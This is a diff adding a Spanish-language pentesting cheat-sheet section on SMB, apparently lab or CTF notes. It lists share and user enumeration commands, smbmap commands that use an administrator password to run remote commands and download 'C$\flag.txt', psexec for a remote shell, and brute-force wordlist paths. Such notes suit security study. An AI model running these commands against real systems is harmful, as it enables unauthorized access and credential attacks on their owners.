@@ -21,3 +21,42 @@ Lista de palabras para ataques de fuerza bruta
 /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 ```
 
+### Server Message Block (SMB) - 137,138,139,445
+Server Message Block (SMB) es un protocolo de red que facilita el intercambio de archivos, impresoras y recursos entre sistemas. Opera en los puertos 137, 138, 139 y 445. A pesar de su utilidad, el puerto 445 es conocido por vulnerabilidades de seguridad.
+
+```python
+smbclient -N -L //IP (list shares)
+nmap -sV -sC -p 445 IP
+smbclient //IP/notes (connecting shares)
+sudo nmap IP -sV -sC -p139,445
+rpcclient -U "" IP (srvinfo, enumdomains, querydominfo, netshareenumall, enumdomusers)
+smbmap -H IP -u "" -p "" (para revisar que permisos)
+smbmap -H IP -u administrator -p smbserver_771 -x 'ipconfig'
+smbmap -H IP -u Administrator -p 'smbserver_771' -r 'C$'
+smbmap -H IP -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
+crackmapexec smb IP --shares -u '' -p '' (revisar permisos)
+./enum4linux-ng.py IP -A
+enum4linux -u vagrant -p vagrant -U IP (enumerar usuarios)
+nmap -p445 --script smb-protocols IP
+nmap -p445 --script smb-security-mode IP
+nmap -p445 --script smb-enum-sessions IP
+nmap --script smb-os-discovery -p445 IP
+enum4linux -r -u "admin" -p "password1" IP (obtener el ssid de los usuarios)
+cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
+
+Tools: 
+Psexec - conexión para smb que nos brinda shell
+https://github.com/fortra/impacket/blob/master/examples/psexec.py
+
+```
+
+#### Diccionarios
+Lista de palabras para ataques de fuerza bruta
+
+```python
+/usr/share/metasploit-framework/data/wordlists/common_users.txt
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+/usr/share/wordlists/metasploit/unix_passwords.txt
+/usr/share/wordlists/metasploit/unix_users.txt
+/usr/share/wordlists/rockyou.tx
+```
